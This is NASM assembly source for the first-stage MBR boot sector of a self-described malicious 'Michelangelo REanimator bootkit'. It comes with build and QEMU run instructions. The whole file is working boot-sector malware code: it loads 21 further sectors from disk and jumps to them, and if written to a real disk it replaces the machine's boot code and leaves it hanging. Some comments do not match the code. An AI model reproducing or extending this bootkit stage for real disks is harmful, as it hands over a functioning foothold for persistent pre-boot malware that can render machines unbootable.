[bits 16]
;.286			;masm specific
;.MODEL TINY		;masm specific


;******************************************************************************
;	This is the working demo of stage 1 of the malicious MBR/boot sector
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************

.CODE:
org 0x7C00

;******************************************************************************
;SCREEN_WIDTH		equ	0x140							;;320
;SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
;SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
;SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
;OFFSET_SCREEN_H		equ SCALED_SCREEN_H*SCREEN_WIDTH
;SECTOR_SIZE			equ 0x200
;SCALE_MULTIPLIER	equ 4

;VGA_PAL_INDEX		equ	0x3C8
;VGA_PAL_DATA		equ	0x3C9
;******************************************************************************
VX_BOOT:
cli
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		ax, 0x7c00
mov		sp, ax
sti

load_vx_paint:
	mov ax, 0x0		;reset disk
	int 13h
	push cs
	pop es
	push cs
	pop ds
	mov [DefaultDisk], dl
	mov ax, 0x0900
	mov es, ax
	mov ds, ax

;	mov cx, 0x2
;	push cx
	
	xor di, di
	xor si, si
	read_sector:
		mov ax, 0x215	;read twenty one sectors of disk
		mov ch, 0
		mov cl, 4		;cylinder 0, sector 3 
		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
;		mov dl, [DefaultDisk]
		mov bx, 0x200
		int 13h
		
		;inc cl
		;mov byte [sector_count], cl
		mov cx, 2400
		loop:
			mov word ax, [bx]
			mov word [es:di], ax
			add bx,2
			add di,2
			dec cx
			cmp cx, 0
			jnz loop
		repnz
	
	
	jmp boot2nd:0

;sector_count:
;	db 0x03

;num_sectors:
;	dw 0x0

;sector_num equ sector_count+num_sectors

DefaultDisk:
	db 0x80

boot2nd equ 0x900

partition_start:	
	times 0x1BE-($-$$) db 0

driverrollupthepartitionplz:
db 0x80, 0x01, 0x01, 0x00, 0x06, 0x1f, 0xbf, 0x08, 0x3f, 0x00, 0x00, 0x00, 0xc1, 0xfe, 0x0f, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

VXend:
	times 510-($-$$) db 0
	db 0x55
	db 0xAA

